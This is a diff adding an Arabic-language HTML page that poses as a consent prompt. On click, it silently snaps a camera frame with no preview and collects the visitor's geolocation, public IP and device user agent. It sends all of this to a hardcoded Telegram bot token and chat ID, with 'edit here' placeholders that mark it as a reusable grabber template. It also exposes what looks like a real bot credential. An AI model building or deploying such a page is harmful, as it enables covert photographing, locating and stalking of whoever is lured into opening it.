@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>موافقة</title>
+<style>
+body {
+  font-family: Arial;
+  text-align: center;
+  margin-top: 40px;
+}
+img {
+  width: 220px;
+  display: block;
+  margin: 20px auto;
+}
+button {
+  padding: 10px 20px;
+  font-size: 16px;
+}
+</style>
+</head>
+<body>
+
+<h3>📸 سيتم التقاط صورة بعد موافقتك</h3>
+<p>وسيتم إرسالها مع الموقع ونوع الجهاز.</p>
+
+<!-- 🔽 ضع رابط الصورة هنا -->
+<img src="https://ugc.production.linktr.ee/33eeaee9-a676-4312-b3bc-768c4266ef01_IMG-2923.webp?io=true&size=avatar-v3_0" alt="صورة">
+
+<button onclick="start()">موافق</button>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+/* 🔧 عدّل هنا */
+const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
+const CHAT_ID  = "6251932709";
+
+async function start() {
+  try {
+    // 🌐 IP
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    const ip = ipData.ip;
+
+    // 📍 الموقع
+    navigator.geolocation.getCurrentPosition(async pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      // 📸 الكاميرا (بدون معاينة)
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.getElementById("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      const imageBase64 = canvas.toDataURL("image/png");
+      stream.getTracks().forEach(t => t.stop());
+
+      // 📱 نوع الجهاز
+      const device = navigator.userAgent;
+
+      const text = `
+📸 صورة جديدة
+🌍 الموقع: ${lat}, ${lon}
+🌐 IP: ${ip}
+📱 الجهاز: ${device}
+      `;
+
+      // 📩 إرسال النص
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text
+        })
+      });
+
+      // 📷 إرسال الصورة
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          photo: imageBase64
+        })
+      });
+
+      alert("✅ تم الإرسال");
+
+    }, () => alert("❌ تم رفض الموقع"));
+
+  } catch (e) {
+    alert("❌ حدث خطأ");
+  }
+}
+</script>
+
+</body>
+</html>
